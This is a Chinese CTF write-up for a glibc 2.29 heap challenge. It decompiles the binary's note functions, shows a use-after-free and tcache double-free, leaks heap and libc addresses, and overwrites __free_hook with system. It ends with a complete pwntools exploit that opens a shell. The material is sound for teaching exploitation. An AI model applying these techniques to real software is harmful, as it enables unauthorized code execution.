# 新春战“疫”第一天  document

### 0x1 分析

一个刚学堆的菜鸡看到这道题，怎么看都想不出来怎么解，看了别人的WP又发现自己的测试环境也不对，思路就完全错了。~~真想找块豆腐砸死自己。~~

看一下安全性，挺~~新手友好~~的。

```shell
		Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

程序逻辑倒是很简单，note的四个操作函数，看`main`函数就一目了然：

`main`:

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // eax
  char buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  std();
  say_something();
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      read(0, &buf, 8uLL);
      v3 = atoi(&buf);
      if ( v3 != 2LL )
        break;                                  // 2
      show();
    }
    if ( v3 > 2LL )
    {
      if ( v3 == 3LL )                          // 3
      {
        edit();
      }
      else if ( v3 == 4LL )                     // 4
      {
        delete();
      }
    }
    else if ( v3 == 1LL )                       // 1
    {
      add();
    }
  }
}
```

四个函数贴在下面：

`add()`：

```c
unsigned __int64 add()
{
  signed int i; // [rsp+Ch] [rbp-24h]
  _QWORD *document_ptr; // [rsp+10h] [rbp-20h]
  void *document; // [rsp+18h] [rbp-18h]
  __int64 s; // [rsp+20h] [rbp-10h]
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  for ( i = 0; i < 7; ++i )
  {
    if ( !documentList[i] )
    {
      document_ptr = malloc(8uLL);              // |ptr |flag
      document = malloc(0x80uLL);               // |name|sex |content
      if ( !document_ptr || !document )
      {
        puts("Error occured!!!");
        exit(2);
      }
      puts("add success");
      *document_ptr = document;
      document_ptr[1] = 1LL;
      puts("input name");
      memset(&s, 0, 8uLL);
      input((char *)&s, 8);
      *(_QWORD *)document = s;
      puts("input sex");
      memset(&s, 0, 8uLL);
      input((char *)&s, 1);
      puts("here");
      if ( (_BYTE)s == aW[0] )
      {
        *((_QWORD *)document + 1) = 1LL;        // women
      }
      else
      {
        puts("there");
        *((_QWORD *)document + 1) = 16LL;       // man
      }
      puts("input information");
      input((char *)document + 16, 0x70);
      documentList[i] = document_ptr;
      puts("Success");
      break;
    }
  }
  if ( i == 7 )
    puts("Th3 1ist is fu11");                   // max 7
  return __readfsqword(0x28u) ^ v5;
}
```

最多一共可以建立7个堆，每一个大堆由一个小堆指向。

`show()`:

```c
unsigned __int64 show()
{
  unsigned int v1; // [rsp+Ch] [rbp-14h]
  char buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("Give me your index : ");
  read(0, &buf, 8uLL);
  v1 = atoi(&buf);
  if ( v1 >= 7 )
  {
    puts("Out of list");
  }
  else if ( documentList[v1] )
  {
    print((const char *)*documentList[v1]);
  }
  else
  {
    puts("invalid");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

单纯的展示一下指定的输出大堆里内容。

`edit()`:

```c
unsigned __int64 edit()
{
  unsigned int v1; // [rsp+8h] [rbp-28h]
  _QWORD *document_ptr; // [rsp+10h] [rbp-20h]
  _BYTE *sex; // [rsp+18h] [rbp-18h]
  char buf; // [rsp+20h] [rbp-10h]
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  puts("Give me your index : ");
  read(0, &buf, 8uLL);
  v1 = atoi(&buf);
  if ( v1 >= 7 )
  {
    puts("Out of list");
  }
  else if ( documentList[v1] )                  // |name
  {                                             // |sex
    document_ptr = documentList[v1];            // |content
    if ( document_ptr[1] )
    {
      puts("Are you sure change sex?");
      read(0, &buf, 8uLL);
      if ( buf == aY[0] )
      {
        puts("3");
        sex = (_BYTE *)(*documentList[v1] + 8LL);// bk
        if ( *sex == man )
        {
          puts(&a124[2]);
          *sex = 1;
        }
        else
        {
          puts(a124);
          *sex = 0x10;
        }
      }
      else
      {
        puts(&a124[4]);
      }
      puts("Now change information");
      if ( !(unsigned int)input((char *)(*documentList[v1] + 0x10LL), 0x70) )
        puts("nothing");
      document_ptr[1] = 0LL;
    }
    else
    {
      puts("you can onyly change your letter once.");
    }
  }
  else
  {
    puts("invalid");
  }
  return __readfsqword(0x28u) ^ v5;
}
```

可以修改性别和内容，但是注意这里修改性别可以修改掉`bk`指针的位置的内容。至于怎么用一会儿再说。

`delete()`:

```c
unsigned __int64 delete()
{
  _QWORD *v0; // ST10_8
  unsigned int v2; // [rsp+Ch] [rbp-24h]
  char buf; // [rsp+20h] [rbp-10h]
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  puts("Give me your index : ");
  read(0, &buf, 8uLL);
  v2 = atoi(&buf);
  if ( v2 >= 7 )
  {
    puts("Out of list");
  }
  else if ( documentList[v2] )
  {
    v0 = documentList[v2];                      // UAF
    free((void *)*documentList[v2]);
  }
  else
  {
    puts("invalid");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

这里虽然`free`了大堆，但是并没清空指针。可以UAF。

主要函数都在这里了。思路是围绕glibc-2.29之后的tcache机制展开的。

首先修改tcache的计数位为$7$，因为tcache里相同的块只能存$7$个，然后堆就可以被放到Unsorted Bin里了。这样我们可以通过`show()`来泄漏libc地址。在这之前我们还要泄漏heap的基地址，来确定tcache的地址。然后我们再修改`__free_hook`的GOT为`system`。

我们先建立$3$个大堆，再`free`掉前两个，他们就被存在tcache里，输出后`free`掉的大堆，即可输出前一个大堆的位置，由此确定heap的基地址，从而确定tcache的位置。也就知道了相应的给tcache中大堆计数的位置。

```shell
tcachebins
0x90 [  2]: 0x562bd1d45330 —▸ 0x562bd1d45280 ◂— 0x0
```

然后为了修改计数位，我们需要edit的帮助，需要double free，我们修改`0x562bd1d45330`处的bk指针的位置，绕过double free的检查，再次`free`掉它。

```shell
tcachebins
0x90 [  3]: 0x55c73e8d4330 ◂— 0x55c73e8d4330
```

再次申请这块内存，就可以修改bk指针，从而指向tcache中的计数的位置。

```shell
tcachebins
0x90 [  2]: 0x563ea9adc330 —▸ 0x563ea9adc010 ◂— 0x200000000000000
```

最后的那个`0x200000000000000`就是每个计数的位置。将它修改成`0x700000000000000`即可。

然后再次`free`的时候即可`free`到Unsorted Bin里。接着通过`show()`泄漏`main_arena`位置从而泄漏libc的位置。

然后修改`tcache->entry`把放`0x90`即大堆的位置修改为`__free_hook - 0x10`的位置（因为name 和 sex 还占着`0x10`的大小，修改`__free_hook`指向`system`，顺便在name的位置写入`/bin/sh\x00`

```shell
修改`__free_hook`之前：
0x7ffa84a898e8 <__free_hook>:   0x0000000000000000      0x0000000000000000
0x7ffa84a898f8 <next_to_use.11802>:     0x0000000000000000      0x0000000000000000
```

```shell
修改`__free_hook`之后：指向system
0x7ffa84a898e8 <__free_hook>:   0x00007ffa846eb440      0x0000000000000000
0x7ffa84a898f8 <next_to_use.11802>:     0x0000000000000000      0x0000000000000000
```

最后调用`free`。

### EXP

```python
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'

p = process('./pwn')
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
def debug(p, cmd):
  '''cmd = 'b *%d\n' %(proc_base+breakaddr)'''
  gdb.attach(p, cmd)
  pause()

def add(p, name, sex, content):
  p.sendlineafter("Give me your choice :", '1')
  p.sendafter("input name", name.ljust(0x8, '\x00'))
  p.sendafter("input sex", sex)
  p.sendafter("input information", content.ljust(0x70, '\x00'))

def show(p, idx):
  p.sendlineafter("Give me your choice :", '2')
  p.sendlineafter("Give me your index : ", str(idx))

def edit(p, idx, sex, content):
  p.sendlineafter("Give me your choice :", '3')
  p.sendlineafter("Give me your index : ", str(idx))
  # debug(p, 'print system')
  p.sendafter("Are you sure change sex?", sex)
  p.sendafter("Now change information\n", content.ljust(0x70, '\x00'))

def delete(p, idx):
  p.sendlineafter("Give me your choice :", '4')
  p.sendlineafter("Give me your index : ", str(idx))

add(p, 'aaaaaaa', '0', '\x00')
add(p, 'aaaaaaa', '1', '\x00')
add(p, 'aaaaaaa', '2', '\x00')

delete(p, 0)
delete(p, 1)

show(p, 1)
p.recvuntil("\n")
heapbase = u64(p.recvuntil('\n')[:-1].ljust(8, '\x00')) - 0x250 - 0x10 - 0x20
print(hex(heapbase))
pause()

edit(p, 1, 'Y', '\x00')
delete(p, 1)

add(p, p64(heapbase + 0x10), '3', '\x00')
add(p, 'aaaaaaa', '4', '\x00')
add(p, p64(0x700000000000000), '5', '\x00')
delete(p, 3)
show(p, 3)

main_arena = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 96
libc_base = main_arena - libc.symbols['__malloc_hook'] - 0x10
print hex(libc_base)
pause()

free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']
print hex(system)
# debug(p, 'print system')

payload = '\x00'*0x68 + p64(free_hook - 0x10)
edit(p, 5, '5', payload)
add(p, '/bin/sh\x00', '6', p64(system))
print hex(free_hook)
print hex(system)
# debug(p, 'print system\n')

delete(p, 6)
p.interactive()
```

